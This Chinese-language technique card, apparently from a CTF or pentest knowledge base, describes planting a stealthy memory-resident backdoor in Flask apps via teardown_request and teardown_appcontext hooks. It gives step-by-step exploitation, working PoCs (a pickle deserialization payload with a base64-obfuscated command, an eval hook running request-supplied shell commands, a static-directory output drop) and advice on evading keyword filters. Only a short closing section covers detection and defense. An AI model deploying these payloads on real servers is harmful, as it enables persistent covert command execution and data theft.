---
id: web-python-framework-flask-teardown-hook-memshell
title: Flask teardown 钩子内存马：teardown_request/teardown_appcontext 响应后执行与静态目录落盘回显
type: scenario
domain: web
path: web/python/framework
technique: flask-teardown-hook-memshell
aliases:
- Flask teardown_request 内存马
- teardown_appcontext 后门
- teardown_request_funcs 注入
- teardown_appcontext_funcs 注入
- 响应后钩子内存马
- Flask 无回显落盘
tags:
- web
- python
- flask
- memshell
- persistence
- ssti
- pickle
- after-response
cve: []
severity: high
confidence: high
status: verified
created: '2026-11-09'
updated: '2026-11-09'
verification:
  verified_by: verifier-V402
  verified_at: '2026-11-09T13:04:56+08:00'
  notes: 已对照13976原文及11张图核对。teardown回调必收exc参数、零参lambda抛TypeError且函数体不执行、teardown_request阶段request.args可读、teardown_appcontext阶段访问request抛RuntimeError，均已在本机Flask 2.3.3源码与实测复核，worker对原文的修正准确。--force理由成立：flask-hook-registry-memshell全文无teardown，注册表与调用时机确为独立场景。dup-scan.json(11-08)早于建卡且无本篇pair。原文未声明受影响版本区间，未填affected_versions。未复测点：原文Flask 3.0.1环境的具体行为。
---

## 一句话结论

在 Flask 应用内取得代码执行（SSTI、eval、pickle 反序列化）后，把恶意函数追加进 `app.teardown_request_funcs[None]` 或 `app.teardown_appcontext_funcs`，就能让代码在每次请求的响应生成之后自动执行且不改动正常页面；由于 teardown 阶段拿不到 response 对象、返回值被忽略，回显要把命令输出重定向写入 Web 静态目录等可读位置，或走带外通道。

## 原理

- `@app.teardown_request` 装饰器底层只是 `self.teardown_request_funcs.setdefault(None, []).append(f)`；`@app.teardown_appcontext` 底层只是 `self.teardown_appcontext_funcs.append(f)`。两者都带 `@setupmethod`，首个请求处理过后再调用装饰器会抛 `AssertionError`，但注册表本身是普通 dict/list，直接 append 即可绕过该检查。
- 调用时机：`do_teardown_request` 在 `RequestContext.pop()` 内、请求上下文真正弹出之前执行；`do_teardown_appcontext` 在应用上下文弹出时执行，通常发生在请求上下文销毁之后。两者都在响应生成/发送阶段之后运行，返回值被忽略，因此不能像 `before_request`/`after_request` 那样把命令输出直接拼进响应体。
- 回调签名：teardown 系列回调会被传入一个异常参数（请求正常时为 `None`，未处理异常时为异常对象），注入的 lambda 必须能接收该参数（如 `lambda exc: ...`）；写成零参 lambda 会抛 `TypeError: <lambda>() takes 0 positional arguments but 1 was given`，函数体不会执行。
- 请求上下文可用性差异：`teardown_request` 阶段请求上下文尚未弹出，本地 Flask 2.3.3 实测回调里 `request.args.get('cmd')` 仍可读到当前请求参数；`teardown_appcontext` 阶段请求上下文已销毁，访问 `request` 抛 `RuntimeError: Working outside of request context`，只能执行静态命令。原文称 teardown_request 也不能取 request，与源码调用顺序和实测不符，实际利用前建议在目标版本先验证。
- 为什么需要落盘回显：teardown 回调没有 response 参数，输出无处返回；常见做法是在命令里把结果重定向到应用的静态目录（如 `cat flag.txt > static/flag.txt`），再从 HTTP 取回；也可写入模块级变量/文件供另一个入口读取，或在无回显、不出网环境下用 DNS/HTTP 带外。
- 隐蔽性：teardown 钩子不改变任何正常响应，访问任意页面都无差异；相比 `before_request`（所有页面返回 lambda 结果、容易被搭便车发现）更不易暴露。

## 触发条件

- 存在可执行 Python 代码的入口（Jinja2 SSTI、`eval`/`exec` 注入、`pickle.loads` 反序列化等），且能拿到 `app` 对象（如 `url_for.__globals__['current_app']`，或在 pickle 入口所在模块的全局命名空间中直接引用 `app`）。
- Flask 应用进程不重启（内存马只存在于当前进程）。
- `teardown_request` 型：命令可静态写死，也可在 request 仍可用的版本上用请求参数动态取命令；`teardown_appcontext` 型只能执行静态或预先编码好的命令，不能依赖当前请求参数。
- 需要取回结果时，目标存在可写的 Web 静态目录/可写路径，或有可用的带外通道；否则只能盲执行。

## 利用步骤

1. 通过 SSTI/eval/pickle 拿到 `current_app` 或所在模块的 `app`，确认能执行任意 Python。
2. 选择钩子：要在请求收尾执行并可能读取请求参数选 `teardown_request`；只求每次请求稳定执行静态命令选 `teardown_appcontext`。
3. 直接改写注册表，不经过 `@setupmethod` 装饰器：
   - `app.teardown_request_funcs.setdefault(None, []).append(lambda exc: ...)`
   - `app.teardown_appcontext_funcs.append(lambda exc: ...)`
4. 访问任意路由或刷新页面触发；命令执行发生在响应之后，页面内容不变。
5. 回显：命令内把输出重定向到静态目录（`/app/static/xxx` 等）后 GET 读取，或经带外通道获取。

## PoC

pickle 反序列化入口，`__reduce__` 返回 `eval`，注册 teardown_request 钩子并把 flag 写入静态目录（命令字符串 base64 编码，解码后为 `cat flag.txt > /app/static/flag.txt`，路径按目标调整）：

```python
import pickle, base64

class Exp:
    def __reduce__(self):
        return (eval, ("app.teardown_request_funcs.setdefault(None, []).append(lambda exc: __import__('os').system(base64.b64decode('Y2F0IGZsYWcudHh0ID4gL2FwcC9zdGF0aWMvZmxhZy50eHQ=').decode()))",))

print(base64.b64encode(pickle.dumps(Exp())).decode())
```

提交后反复访问任意页面让钩子执行，再请求 `/static/flag.txt` 取回结果。

直接 eval 的等价形式（teardown_request，request 仍可用的版本可用；输出被丢弃，需要自行落盘/带外）：

```python
app.teardown_request_funcs.setdefault(None, []).append(
    lambda exc: __import__('os').popen(request.args.get('cmd', 'whoami')).read())
```

teardown_appcontext 形式（无 request，只能静态命令）：

```python
app.teardown_appcontext_funcs.append(
    lambda exc: __import__('os').system('id > /app/static/out.txt'))
```

## 变体与关联

- 与 `before_request_funcs`/`after_request_funcs` 注册表内存马相比：before/after 能直接把输出作为响应回显，但会改变页面行为；teardown 系列页面完全无感，代价是输出丢弃、需要落盘或带外。
- 过滤绕过变体：目标过滤 `before`/`after` 关键字时可改用 teardown 系列；命令中的 `static`、`>`、`/` 等敏感词先用 base64 编码放进 payload、运行时 `b64decode` 还原，绕过对序列化数据的明文检查，再写静态目录取回。
- 关联卡片：[[web-python-framework-flask-hook-registry-memshell]]（before/after/url_value/template_context 钩子注册表）、[[web-python-framework-flask-error-handler-404-rc4-backdoor]]（error_handler_spec 型）、[[web-python-framework-flask-route-registration-memshell]]（路由注册型）、[[web-python-deserialization-flask-pickle-after-request-command-echo]]（pickle 入口 + after_request 回显）。
- 变体：`teardown_appcontext` 在 CLI 命令结束、手动 `app_context()` 退出等场景也会触发，但攻击者主要利用 Web 请求路径。

## 检测与防御

- 运行时枚举 `app.teardown_request_funcs`、`app.teardown_appcontext_funcs`，关注匿名 lambda、`exec` 生成函数、`__code__.co_filename` 为 `<string>` 等启动后才出现的条目；正常应用的 teardown 回调应在启动阶段固定。
- 监控 Web 静态目录与可写目录的新增文件及内容变更，尤其文件名/内容与命令输出特征相关的情况。
- 限制 `os.popen`/`os.system`/`subprocess` 的调用，消除 SSTI、`eval`/`exec`、不可信 `pickle.loads` 等代码执行入口。
- 发现植入后重启进程清除内存马，并同时排查是否存在其它钩子、路由、错误处理器等注册点。
